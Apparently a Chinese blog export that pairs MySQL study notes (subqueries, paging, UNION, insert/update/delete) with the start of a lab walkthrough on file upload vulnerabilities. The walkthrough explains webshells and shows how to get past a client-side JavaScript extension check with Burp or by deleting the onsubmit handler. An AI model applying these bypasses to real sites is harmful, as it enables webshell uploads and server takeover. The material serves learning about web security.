<h5 id="二、select后面-了解"><a href="#二、select后面-了解" class="headerlink" title="二、select后面(了解)"></a>二、select后面(了解)</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select后面仅仅支持标量子查询</span><br><span class="line"></span><br><span class="line">案例1:查询每个部门的员工个数</span><br><span class="line">mysql&gt; select d.*,(select count(*)</span><br><span class="line">    -&gt; from employees e</span><br><span class="line">    -&gt; where e.department_id&#x3D;d.department_id)</span><br><span class="line">    -&gt; from departments d;</span><br><span class="line"></span><br><span class="line">案例2:查询员工号&#x3D;102的部门名</span><br><span class="line">mysql&gt; select (</span><br><span class="line">    -&gt; select department_name</span><br><span class="line">    -&gt; from departments d</span><br><span class="line">    -&gt; inner join employees e</span><br><span class="line">    -&gt; on d.department_id &#x3D; e.department_id</span><br><span class="line">    -&gt; where e.employee_id &#x3D; 102) 部门名;</span><br><span class="line">+--------+</span><br><span class="line">| 部门名       |</span><br><span class="line">+--------+</span><br><span class="line">| Exe    |</span><br><span class="line">+--------+</span><br></pre></td></tr></table></figure>

<h5 id="三、from后面"><a href="#三、from后面" class="headerlink" title="三、from后面"></a>三、from后面</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">将子查询结果充当一张表，要求必须起别名</span><br><span class="line">案例:查询每个部门的平均工资的工资等级</span><br><span class="line">①先查询部门的平均工资</span><br><span class="line">select avg(salary) ag,department_id</span><br><span class="line">    -&gt; from employees</span><br><span class="line">    -&gt; group by department_id</span><br><span class="line">②将查询工资等级并将平均工资表连接，进行工资等级判断</span><br><span class="line">mysql&gt; select ag_dep.*,g.grade_level</span><br><span class="line">    -&gt; from (</span><br><span class="line">    -&gt; select avg(salary) ag,department_id</span><br><span class="line">    -&gt; from employees</span><br><span class="line">    -&gt; group by department_id) ag_dep 	#子查询必须加别名不然找不到</span><br><span class="line">    -&gt; inner join job_grades g</span><br><span class="line">    -&gt; on ag_dep.ag between lowest_sal and highest_sal;</span><br></pre></td></tr></table></figure>

<h5 id="四、exists-相关子查询"><a href="#四、exists-相关子查询" class="headerlink" title="四、exists(相关子查询)"></a>四、exists(相关子查询)</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#exists(是否存在)</span><br><span class="line">语法:</span><br><span class="line">	exists(完整的查询)</span><br><span class="line">结果:</span><br><span class="line">	1或者是0		#1也就相当于布尔类型的True，0代表False</span><br><span class="line">exists相当于布尔类型，只判断True和False</span><br><span class="line">因为子查询中有数值所以返回1</span><br><span class="line">mysql&gt; select exists(select employee_id from employees) result;</span><br><span class="line">+--------+</span><br><span class="line">| result |</span><br><span class="line">+--------+</span><br><span class="line">|      1 |</span><br><span class="line">+--------+</span><br><span class="line"></span><br><span class="line">在子查询中筛选了salary中等于3w的数值，但是salary中并没有3w所以返回0</span><br><span class="line">mysql&gt; select exists(select employee_id from employees where salary&#x3D;30000) result;</span><br><span class="line">+--------+</span><br><span class="line">| result |</span><br><span class="line">+--------+</span><br><span class="line">|      0 |</span><br><span class="line">+--------+</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">但凡能用exists的都可以用in来代替</span><br><span class="line">案例一:查询有员工名的部门名</span><br><span class="line">#exists</span><br><span class="line">mysql&gt; select department_name</span><br><span class="line">    -&gt; from departments d</span><br><span class="line">    -&gt; where exists(select * from employees e</span><br><span class="line">    -&gt; where d.department_id &#x3D; e.department_id);</span><br><span class="line">+-----------------+</span><br><span class="line">| department_name |</span><br><span class="line">+-----------------+</span><br><span class="line">| Adm             |</span><br><span class="line">| Mar             |</span><br><span class="line">| Pur             |</span><br><span class="line">| Hum             |</span><br><span class="line">| Shi             |</span><br><span class="line">| IT              |</span><br><span class="line">| Pub             |</span><br><span class="line">| Sal             |</span><br><span class="line">| Exe             |</span><br><span class="line">| Fin             |</span><br><span class="line">| Acc             |</span><br><span class="line">+-----------------+    </span><br><span class="line"></span><br><span class="line">#in</span><br><span class="line">mysql&gt; select department_name from departments d</span><br><span class="line">    -&gt; where department_id in (select department_id from employees);</span><br><span class="line"></span><br><span class="line">案例2:查询没有女朋友的男神信息</span><br><span class="line">#in</span><br><span class="line">mysql&gt; select bo.*</span><br><span class="line">    -&gt; from boys bo</span><br><span class="line">    -&gt; where bo.id not in (select boyfriend_id</span><br><span class="line">    -&gt; from beauty);</span><br><span class="line">#exists</span><br><span class="line">mysql&gt; select bo.*</span><br><span class="line">    -&gt; from boys bo</span><br><span class="line">    -&gt; where not exists (select * from beauty</span><br><span class="line">    -&gt; where bo.id&#x3D;beauty.boyfriend_id);</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">子查询案例:</span><br><span class="line">查询各部门中工资比本部门平均工资高的员工的员工号，姓名和工资</span><br><span class="line">mysql&gt; select employee_id,last_name,salary,e.department_id</span><br><span class="line">    -&gt; from employees e</span><br><span class="line">    -&gt; inner join (</span><br><span class="line">    -&gt; select avg(salary) ag,department_id</span><br><span class="line">    -&gt; from employees</span><br><span class="line">    -&gt; group by department_id) ag_dep</span><br><span class="line">    -&gt; on e.department_id &#x3D; ag_dep.department_id</span><br><span class="line">    -&gt; where salary&gt;ag_dep.ag;</span><br></pre></td></tr></table></figure>

<h5 id="分页查询-重点"><a href="#分页查询-重点" class="headerlink" title="分页查询(重点)"></a>分页查询(重点)</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">应用场景:当要查询的条目太多，一页显示不全</span><br><span class="line">1、limit用来获取一张表中某部分数据</span><br><span class="line">2、limit只有在MySQL中存在不通用，是MySQL数据库管理系统的特色</span><br><span class="line">语法:</span><br><span class="line">	select 查询列表		#7</span><br><span class="line">	from 表		#执行循序 1</span><br><span class="line">	【join type join 表2		#2</span><br><span class="line">	【on 连接条件】		#3</span><br><span class="line">	【where 筛选条件】		#4</span><br><span class="line">	【group by 分组字段】		#5</span><br><span class="line">	【having 分组后筛选】	#6</span><br><span class="line">	【order by 排序的字段】		#8</span><br><span class="line">	limit 【offset】,size;	#9  offset可以省略，省略之后默认起始值是0</span><br><span class="line">	</span><br><span class="line">	offset表示要显示条目的起始索引(起始索引从0开始，)</span><br><span class="line">	如果起始下标没有指定，默认从0开始，0标识表中第一条记录</span><br><span class="line">	size表示要显示的条目个数</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">特点:</span><br><span class="line">	①limit语句放在查询语句的最后，</span><br><span class="line">	②公式</span><br><span class="line">	要显示的页数 page，每页的条目数是size</span><br><span class="line">通用的分页sql【只适合MySQL数据库管理系统】	</span><br><span class="line">	select 查询列表 </span><br><span class="line">	from 表 </span><br><span class="line">	limit (page-1)*size,size;</span><br><span class="line">规律：</span><br><span class="line">	size &#x3D; 10</span><br><span class="line">	</span><br><span class="line">	page 		size</span><br><span class="line">	1			0</span><br><span class="line">	2			10</span><br><span class="line">	3			20</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">案例1:查询前五条员工信息</span><br><span class="line">mysql&gt; select * from employees limit 0,5;</span><br><span class="line">或</span><br><span class="line">mysql&gt; select * from employees limit 5;</span><br><span class="line"></span><br><span class="line">案例2:查询第11条到第25条</span><br><span class="line">mysql&gt; select * from employees limit 11,15;</span><br><span class="line"></span><br><span class="line">案例3:有奖金的员工信息，并且工资较高的前10名显示出来</span><br><span class="line">mysql&gt; select * from employees</span><br><span class="line">    -&gt; where commission_pct is not null</span><br><span class="line">    -&gt; order by salary desc</span><br><span class="line">    -&gt; limit 10;</span><br></pre></td></tr></table></figure>

<h4 id="联合查询"><a href="#联合查询" class="headerlink" title="联合查询"></a>联合查询</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">union 联合 合并; 将多条查询语句的结果合并成一个结果</span><br><span class="line">&lt;&gt; 也就是相当于联合查询中包含多条查询语句，每个查询语句都是有一个小结果，用union一联合就会将多个结果合并成一个结果</span><br><span class="line"></span><br><span class="line">语法:</span><br><span class="line">查询语句1</span><br><span class="line">union</span><br><span class="line">查询语句2</span><br><span class="line">union</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">应用场景:</span><br><span class="line">要查询的结果来自于多个表，且多个表没有直接的连接关系，但查询的信息一致时</span><br><span class="line"></span><br><span class="line">注意事项: ★</span><br><span class="line">	1、要求多条查询语句的查询列数是一致的</span><br><span class="line">	2、要求多条查询语句的查询的每一列的类型和顺序最好是一致的</span><br><span class="line">	3、使用union关键字默认去重，如果使用union all 可以包含重复项</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">引入案例:查询部门编号&gt;90或者邮箱中包含a的员工信息</span><br><span class="line">之前实现语法:</span><br><span class="line">mysql&gt; select * from employees where email like &#39;%a%&#39; or department_id&gt;90;</span><br><span class="line">union实现语法:</span><br><span class="line"># 将邮箱中包含a的员工信息查找出来，这是第一个结果</span><br><span class="line">mysql&gt; select * from employees where email like &#39;%a%&#39;</span><br><span class="line"># 使用union联合查询，将两条结果合并成一个结果</span><br><span class="line">    -&gt; union</span><br><span class="line"># 将部门编号&gt;90的信息查找出来，这是第二个结果，</span><br><span class="line">    -&gt; select * from employees where department_id&gt;90;</span><br></pre></td></tr></table></figure>

<h3 id="DML语言"><a href="#DML语言" class="headerlink" title="DML语言"></a>DML语言</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">DML语言可以以称作:数据操作语言</span><br><span class="line"></span><br><span class="line">涉及到：</span><br><span class="line">数据的 插入:insert</span><br><span class="line">数据的 修改:update</span><br><span class="line">数据的 删除:delete</span><br></pre></td></tr></table></figure>

<h4 id="插入语句"><a href="#插入语句" class="headerlink" title="插入语句"></a>插入语句</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">insert语法中要包含 表名、字段名、值</span><br><span class="line">语法：</span><br><span class="line">insert into 表名(字段名,......) values(值1,....);</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">方式一:经典的插入</span><br><span class="line"></span><br><span class="line">注意:</span><br><span class="line">1、插入的值得类型要与列的类型一致或兼容</span><br><span class="line">mysql&gt; insert into beauty(id,name,sex,borndate,phone,photo,boyfriend_id)</span><br><span class="line">    -&gt; values(13,&#39;唐艺昕&#39;,&#39;女&#39;,&#39;1990-4-23&#39;,&#39;1898888888&#39;,null,2);</span><br><span class="line">+----+------------+------+---------------------+-------------+-------+-------+</span><br><span class="line">| 12 | 赵敏    | 女    | 1992-02-03 00:00:00 | 18209179577 | NULL  |       1 |</span><br><span class="line">| 13 | 唐艺昕   | 女    | 1990-04-23 00:00:00 | 1898888888  | NULL  |      2 |</span><br><span class="line">+----+------------+------+---------------------+-------------+-------+-------+</span><br><span class="line"></span><br><span class="line">2、不可以为null的列必须插入值，可以为null的列，如何插入值 </span><br><span class="line"></span><br><span class="line">方式一:</span><br><span class="line">mysql&gt; insert into beauty(id,name,sex,borndate,phone,photo,boyfriend_id)</span><br><span class="line">#可以为null的列不想写入值可以直接写null</span><br><span class="line">    -&gt; values(13,&#39;唐艺昕&#39;,&#39;女&#39;,&#39;1990-4-23&#39;,&#39;1898888888&#39;,null,2);</span><br><span class="line">    </span><br><span class="line">方式二:</span><br><span class="line">#将 为null的列和值不写，其中可以为null的字段不写入值得时候，运行时显示他的默认值</span><br><span class="line">mysql&gt; insert into beauty(id,name,sex,borndate,phone,boyfriend_id)</span><br><span class="line">    -&gt; values(13,&#39;唐艺昕&#39;,&#39;女&#39;,&#39;1990-4-23&#39;,&#39;1898888888&#39;,2);</span><br><span class="line">    </span><br><span class="line">3、列的顺序可以调换，但需要一一对应</span><br><span class="line">mysql&gt; insert into beauty(name,sex,id,phone)</span><br><span class="line">    -&gt; values(&#39;蒋欣&#39;,&#39;女&#39;,16,&#39;110&#39;);</span><br><span class="line">+----+------------+------+---------------------+-------------+-------+-------+</span><br><span class="line">| 16 | 蒋欣     | 女    | 1987-01-01 00:00:00 | 110    | NULL  |     NULL |</span><br><span class="line">+----+------------+------+---------------------+-------------+-------+-------+</span><br><span class="line"></span><br><span class="line">4，列数和值的个数必须一致</span><br><span class="line"># boyfrined_id可以为空，但是values里面的值并没有写入null那这样就会报错</span><br><span class="line">mysql&gt; insert into beauty(name,sex,id,phone,boyfrined_id)</span><br><span class="line">    -&gt; values(&#39;关晓彤&#39;,&#39;女&#39;,17,&#39;110&#39;);</span><br><span class="line"># 报错内容是:列与值不匹配</span><br><span class="line">ERROR 1136 (21S01): Column count doesn&#39;t match value count at row 1</span><br><span class="line"></span><br><span class="line">5，可以省略列名，默认所有列，而且列的顺序和表中的列顺序一致</span><br><span class="line">mysql&gt; insert into beauty</span><br><span class="line">    -&gt; values(14,&#39;张飞&#39;,&#39;男&#39;,null,&#39;11111&#39;,null,null);</span><br><span class="line">+----+------------+------+---------------------+-------------+-------+-------+</span><br><span class="line">| 14 | 张飞      | 男     | NULL       | 11111    | NULL  |      NULL |</span><br><span class="line">+----+------------+------+---------------------+-------------+-------+-------+</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">方式二:</span><br><span class="line"></span><br><span class="line">语法:</span><br><span class="line">insert into 表名</span><br><span class="line">set 列名&#x3D;值,列名&#x3D;值....</span><br><span class="line"></span><br><span class="line">案例1:</span><br><span class="line">mysql&gt; insert into beauty</span><br><span class="line">    -&gt; set id&#x3D;15,name&#x3D;&#39;刘涛&#39;,phone&#x3D;&#39;999&#39;;</span><br><span class="line">+----+------------+------+---------------------+-------------+-------+---+</span><br><span class="line">| 15 | 刘涛   | 女    | 1987-01-01 00:00:00 | 999    | NULL  |      NULL |</span><br><span class="line">+----+------------+------+---------------------+-------------+-------+---+</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">两种方式比较</span><br><span class="line">方式一支持插入多行,方式二不支持</span><br><span class="line">mysql&gt; insert into beauty</span><br><span class="line">    -&gt; values(17,&#39;张飞1&#39;,&#39;男&#39;,null,&#39;11111&#39;,null,2)</span><br><span class="line">    -&gt; ,(18,&#39;张飞2&#39;,&#39;男&#39;,null,&#39;11111&#39;,null,2)</span><br><span class="line">    -&gt; ,(19,&#39;张飞3&#39;,&#39;男&#39;,null,&#39;11111&#39;,null,2);</span><br><span class="line">+----+------------+------+---------------------+-------------+-------+---+</span><br><span class="line">| 17 | 张飞1   | 男     | NULL         | 11111       | NULL  |         2 |</span><br><span class="line">| 18 | 张飞2   | 男     | NULL         | 11111       | NULL  |         2 |</span><br><span class="line">| 19 | 张飞3   | 男     | NULL         | 11111       | NULL  |         2 | </span><br><span class="line">+----+------------+------+---------------------+-------------+-------+---+</span><br><span class="line"></span><br><span class="line">方式一支持子查询，方式二不支持</span><br><span class="line"># 子查询在这里可以充当插入，也可以将select后的值改成变量，来写成完整的子查询</span><br><span class="line">mysql&gt; insert into beauty(id,name,phone)</span><br><span class="line">    -&gt; select 20,&#39;宋茜&#39;,&#39;115112313&#39;;     # 例如: select id,boyname,&#39;115112313&#39;;</span><br><span class="line">+----+------------+------+---------------------+-------------+-------+-------+</span><br><span class="line">| 20 | 宋茜   | 女    | 1987-01-01 00:00:00 | 115112313   | NULL  |     NULL |</span><br><span class="line">+----+------------+------+---------------------+-------------+-------+-------+</span><br></pre></td></tr></table></figure>

<h4 id="二、修改语句"><a href="#二、修改语句" class="headerlink" title="二、修改语句"></a>二、修改语句</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1、修改单表的记录★</span><br><span class="line">语法:</span><br><span class="line">update 表名</span><br><span class="line">set 列&#x3D;新值,列&#x3D;新值,...</span><br><span class="line">where 筛选条件;</span><br><span class="line"></span><br><span class="line">2、修改多表的记录【补充】</span><br><span class="line">sql92语法:</span><br><span class="line">update 表1 别名,表2 别名</span><br><span class="line">set 列&#x3D;值...</span><br><span class="line">where 连接条件 and 筛选条件;</span><br><span class="line"></span><br><span class="line">sql99语法</span><br><span class="line">update 表1 别名</span><br><span class="line">inner|left|right join 表2 别名</span><br><span class="line">on 连接条件</span><br><span class="line">set 列&#x3D;值...</span><br><span class="line">where 筛选条件</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1、修改单表的记录</span><br><span class="line"></span><br><span class="line">案例1: 修改beauty表中姓张的电话为13899888899</span><br><span class="line">mysql&gt; update beauty set phone &#x3D; &#39;13899888899&#39; where name like &#39;张%&#39;;</span><br><span class="line"></span><br><span class="line">案例2: 修改boys表中的id号为2的名称为张飞，魅力值为10</span><br><span class="line">mysql&gt; update boys set boyname&#x3D;&#39;张飞&#39;,usercp&#x3D;10 where id &#x3D; 2;</span><br><span class="line">+----+---------+--------+</span><br><span class="line">| id | boyName | userCP |</span><br><span class="line">+----+---------+--------+</span><br><span class="line">|  1 | 张无忌       |    100 |</span><br><span class="line">|  2 | 张飞       |     10 |</span><br><span class="line">|  3 | 黄晓明        |     50 |</span><br><span class="line">|  4 | 段誉        |    300 |</span><br><span class="line">+----+---------+--------+</span><br><span class="line"></span><br><span class="line">2、修改多表记录【补充】</span><br><span class="line">案例1:修改张无忌的女朋友的手机号为114</span><br><span class="line">mysql&gt; update boys bo</span><br><span class="line">    -&gt; inner join beauty b on bo.id &#x3D; b.boyfriend_id</span><br><span class="line">    -&gt; set b.phone &#x3D; &#39;114&#39;</span><br><span class="line">    -&gt; where bo.boyName &#x3D; &#39;张无忌&#39;;</span><br><span class="line">案例2:修改没有男朋友的女神的男朋友编号都为2号</span><br><span class="line">mysql&gt; update boys bo</span><br><span class="line">    -&gt; right join beauty b on bo.id&#x3D;b.boyfriend_id</span><br><span class="line">    -&gt; set b.boyfriend_id&#x3D;2</span><br><span class="line">    -&gt; where bo.id is null;</span><br></pre></td></tr></table></figure>

<h4 id="三、删除语句"><a href="#三、删除语句" class="headerlink" title="三、删除语句"></a>三、删除语句</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">删除语句删除的时候是直接删除一行而不是单个值</span><br><span class="line"></span><br><span class="line">方式一:delete</span><br><span class="line">语法:</span><br><span class="line">1、单表的删除【★】</span><br><span class="line">delete from 表名 where 筛选条件</span><br><span class="line">2、多表的删除【补充】</span><br><span class="line"></span><br><span class="line">sql92语法：</span><br><span class="line">delete 表1 别名,表2 别名</span><br><span class="line">from 表1 别名,表2 别名</span><br><span class="line">where 连接条件</span><br><span class="line">and 筛选条件</span><br><span class="line"></span><br><span class="line">sql99语法:</span><br><span class="line">delete 表1 别名,表2 别名</span><br><span class="line">from 表1 别名</span><br><span class="line">inner|left|right join 表2 别名 on 连接条件</span><br><span class="line">where 筛选条件</span><br><span class="line"></span><br><span class="line">方式二，truncate</span><br><span class="line">语法: truncate table 表名;</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">方式一：delete</span><br><span class="line">1、单表的删除</span><br><span class="line">案例1：删除手机号结尾为9的女神信息</span><br><span class="line">mysql&gt; delete from beauty where phone like &#39;%9&#39;;</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">2、多表的删除【了解】</span><br><span class="line">案例:删除张无忌的女朋友的信息</span><br><span class="line">mysql&gt; delete b from beauty b</span><br><span class="line">    -&gt; inner join boys bo on b.boyfriend_id &#x3D; bo.id</span><br><span class="line">    -&gt; where bo.boyName &#x3D; &#39;张无忌&#39;;</span><br><span class="line">    </span><br><span class="line">案例:删除黄晓明得信息以及他女朋友的信息</span><br><span class="line">mysql&gt; delete b,bo</span><br><span class="line">    -&gt; from beauty b</span><br><span class="line">    -&gt; inner join boys bo</span><br><span class="line">    -&gt; on b.boyfriend_id&#x3D;bo.id</span><br><span class="line">    -&gt; where bo.boyName&#x3D;&#39;黄晓明&#39;;</span><br></pre></td></tr></table></figure>

<h5 id="方式二-truncate语句"><a href="#方式二-truncate语句" class="headerlink" title="方式二:truncate语句"></a>方式二:truncate语句</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">案例:将魅力值&gt;100的男神信息删除</span><br><span class="line"># truncate的意思是全部清空，后面不能加where筛选，所以不能将&gt;100的信息删除</span><br><span class="line">truncate table boys;</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">delete和truncate的区别</span><br><span class="line">1、delete可以加where条件，truncate不能加</span><br><span class="line">2、truncate删除效率高一点</span><br><span class="line">3、假如要删除的表中有自增长列,如果用delete删除后，在插入数据，自增长列的值从断点开始，而truncate删除后，在插入数据，自增长列的值从1开始</span><br><span class="line">4、truncate删除后没有返回值，delete删除后有返回值</span><br></pre></td></tr></table></figure>

<p>例题:</p>
<h5 id="创建表"><a href="#创建表" class="headerlink" title="创建表"></a>创建表</h5><p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/1580887767466.png" alt="1581509550318"></p>
<h5 id="插入内容"><a href="#插入内容" class="headerlink" title="插入内容"></a>插入内容</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">向my_employees表插入内容</span><br><span class="line">方式一:</span><br><span class="line">mysql&gt; insert into my_employees</span><br><span class="line">    -&gt; values(1,&#39;patel&#39;,&#39;Ralph&#39;,&#39;Rpatel&#39;,&#39;895&#39;),</span><br><span class="line">    -&gt; (2,&#39;Dancs&#39;,&#39;Betty&#39;,&#39;Bdancs&#39;,860),</span><br><span class="line">    -&gt; (3,&#39;Biri&#39;,&#39;Ben&#39;,&#39;Bbiri&#39;,1100),</span><br><span class="line">    -&gt; (4,&#39;Newman&#39;,&#39;Chad&#39;,&#39;Cnewman&#39;,750),</span><br><span class="line">    -&gt; (5,&#39;Ropeburn&#39;,&#39;Audrey&#39;,&#39;Aropebur&#39;,1550);</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/1581512152218.png" alt="1581511994303"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">方式二:</span><br><span class="line">mysql&gt; insert into my_employees</span><br><span class="line">    -&gt; select 1,&#39;patel&#39;,&#39;Ralph&#39;,&#39;Rpatel&#39;,&#39;895&#39; union</span><br><span class="line">    -&gt; select 2,&#39;Dancs&#39;,&#39;Betty&#39;,&#39;Bdancs&#39;,860 union</span><br><span class="line">    -&gt; select 3,&#39;Biri&#39;,&#39;Ben&#39;,&#39;Bbiri&#39;,1100 union</span><br><span class="line">    -&gt; select 4,&#39;Newman&#39;,&#39;Chad&#39;,&#39;Cnewman&#39;,750 union</span><br><span class="line">    -&gt; select 5,&#39;Ropeburn&#39;,&#39;Audrey&#39;,&#39;Aropebur&#39;,1550;</span><br><span class="line">Query OK, 5 rows affected (0.00 sec)</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/1581509550318.png" alt="1581512152218"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">向users表插入内容</span><br><span class="line">mysql&gt; insert into users</span><br><span class="line">    -&gt; values(1,&#39;Rpatel&#39;,10),</span><br><span class="line">    -&gt; (2,&#39;Bdancs&#39;,10),</span><br><span class="line">    -&gt; (3,&#39;Bbiri&#39;,20),</span><br><span class="line">    -&gt; (4,&#39;Cnewman&#39;,30),</span><br><span class="line">    -&gt; (5,&#39;Aropebur&#39;,40);</span><br><span class="line">Query OK, 5 rows affected (0.00 sec)</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/1581512559792.png" alt="1581512559792"></p>
]]></content>
  </entry>
  <entry>
    <title>文件上传</title>
    <url>/2020/04/07/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/</url>
    <content><![CDATA[<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200407160258571.png" alt="image-20200407160258571">介绍文件上传漏洞</p>
<p>现在web应用程序，上传文件一种常见功能，为了提高效率，允许用户上传图片，视频，头像和许多其他的文件。然而向用户提供的功能越多，web应用受到攻击的风险就越大，如果web应用存在文件上传漏洞，那么恶意用户就可以利用文件上传漏洞将可执行脚本程序上传到服务器中，获得网站权限，或者进一步危害服务器</p>
<h5 id="1、为什么文件上传存在漏洞"><a href="#1、为什么文件上传存在漏洞" class="headerlink" title="1、为什么文件上传存在漏洞"></a>1、为什么文件上传存在漏洞</h5><p>上传文件时，如果服务器代码没有对客户端上传的文件进行严格的验证和过滤，就容易造成可以上传任意文件的情况，包括上传脚本文件(asp、aspx、php、jsp等格式文件)</p>
<h5 id="2、危害"><a href="#2、危害" class="headerlink" title="2、危害"></a>2、危害</h5><p>非法用户利用文件上传的恶意脚本控制整个网站，甚至控制服务器，这个恶意脚本文件被称为WebShell，也可以称之为”网页后门”，WebShell具有强大功能，比如查看服务器目录，服务器中的文件，执行系统命令等。</p>
<h4 id="文件上传导致的常见安全问题"><a href="#文件上传导致的常见安全问题" class="headerlink" title="文件上传导致的常见安全问题"></a>文件上传导致的常见安全问题</h4><ul>
<li>上传文件是Web脚本语言，服务器的web容器解释并执行了用户上传的脚本，导致代码执行。</li>
<li>上传文件时Flash的策略文件crossdomain.xml，黑客用以控制Flash在该域下的行为；</li>
<li>上传文件时病毒、木马文件、黑客用以诱骗用户或者管理者下载执行。</li>
<li>上传文件是钓鱼图片或为包含了脚本的图片，在某些版本中的浏览器会被作为脚本执行，被用于钓鱼和欺诈</li>
</ul>
<h5 id="文件上传漏洞一般是指WebShell能被服务器解析的问题，要完成这个攻击要有几个条件"><a href="#文件上传漏洞一般是指WebShell能被服务器解析的问题，要完成这个攻击要有几个条件" class="headerlink" title="文件上传漏洞一般是指WebShell能被服务器解析的问题，要完成这个攻击要有几个条件"></a>文件上传漏洞一般是指WebShell能被服务器解析的问题，要完成这个攻击要有几个条件</h5><p>1、上传的文件能被web容器解析并执行，所以文件上传后所在的目录是要在web容器所覆盖的路径</p>
<p>2、用户能够从web上访问这个文件。如果文件上传了，但用户无法通过web访问，或者无法让web容器解析这个脚本，那么也不能称之为漏洞</p>
<p>3、用户上传的文件若被安全检查、格式化、图片压缩等功能改变了内容，则也可能导致攻击不成功</p>
<h4 id="绕过JS检测验证"><a href="#绕过JS检测验证" class="headerlink" title="绕过JS检测验证"></a>绕过JS检测验证</h4><p>JS检测绕过上传漏洞常见于用户选择文件上传的场景，如果上传文件的后缀不被允许，则会弹窗告知，此时上传文件的数据包并没有发送到服务器端，只是在客户端浏览器使用JavaScript对数据包进行检测。</p>
<p>有两种方法可以绕过客户端JavaScript的检测</p>
<p>1）使用浏览器的插件，删除检测文件后缀的JS代码，然后上传文件即可绕过。</p>
<p>2）先把上传文件的后缀名改为允许上传的，比如：jpg、png、gif等，绕过JS检测，在用BurpSuite抓包，将原本的jpg文件改回php文件</p>
<p>查看界面</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200407135006062.png" alt="image-20200407135006062"></p>
<p>上传php文件看看能否上传，弹出了对话框，这表名验证点在前端，而不是在服务端</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200407135530806.png" alt="image-20200407135530806"></p>
<h5 id="代码分析"><a href="#代码分析" class="headerlink" title="代码分析"></a>代码分析</h5><p>判断了验证点在前端，查看JS判断代码，F12找到判断代码</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200407140025900.png" alt="image-20200407140025900"></p>
<p>把代码抠出来整理</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">function checkFile() &#123;</span><br><span class="line">    var file &#x3D; document.getElementsByName(&#39;upload_file&#39;)[0].value;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    if (file &#x3D;&#x3D; null || file &#x3D;&#x3D; &quot;&quot;) &#123;</span><br><span class="line">        alert(&quot;请选择要上传的文件!&quot;);</span><br><span class="line">        return false;</span><br><span class="line">    &#125;</span><br><span class="line">    &#x2F;&#x2F;定义允许上传的文件类型</span><br><span class="line">    var allow_ext &#x3D; &quot;.jpg|.png|.gif&quot;;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    &#x2F;&#x2F;提取上传文件的类型</span><br><span class="line">    var ext_name &#x3D; file.substring(file.lastIndexOf(&quot;.&quot;));</span><br><span class="line">    &#x2F;&#x2F;判断上传文件类型是否允许上传</span><br><span class="line">    if (allow_ext.indexOf(ext_name + &quot;|&quot;) &#x3D;&#x3D; -1) &#123;</span><br><span class="line">        var errMsg &#x3D; &quot;该文件不允许上传，请上传&quot; + allow_ext + &quot;类型的文件,当前文件类型为：&quot; + ext_name;</span><br><span class="line">        alert(errMsg);</span><br><span class="line">        return false;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以看到，上传之前，通过JS判断一下文件后缀是否为.jpg|.png|.gif,不是就不允许上传</p>
<h5 id="绕过方法"><a href="#绕过方法" class="headerlink" title="绕过方法"></a>绕过方法</h5><p>对于前端js验证的绕过方法较为简单，我们可以将要上传的php文件改后缀名为jpg|png|gif,绕过js验证后，再用burp更改上传请求。或者浏览器禁用js后进行上传</p>
<p>现将文件名改为可上传格式，使用burp抓包改为php这样就可以绕过了</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200407140430474.png" alt="image-20200407140430474"></p>
<p>查看页面，返回空白图片说明成功</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200407140524961.png" alt="image-20200407140524961"></p>
<p>查看根目录</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200407140616118.png" alt="image-20200407140616118"></p>
<p>使用第二种方法，删除检查源码进行上传</p>
<p>按F12打开源码</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200407141341729.png" alt="image-20200407141341729"></p>
<p>删除红线处的内容onsubmit</p>
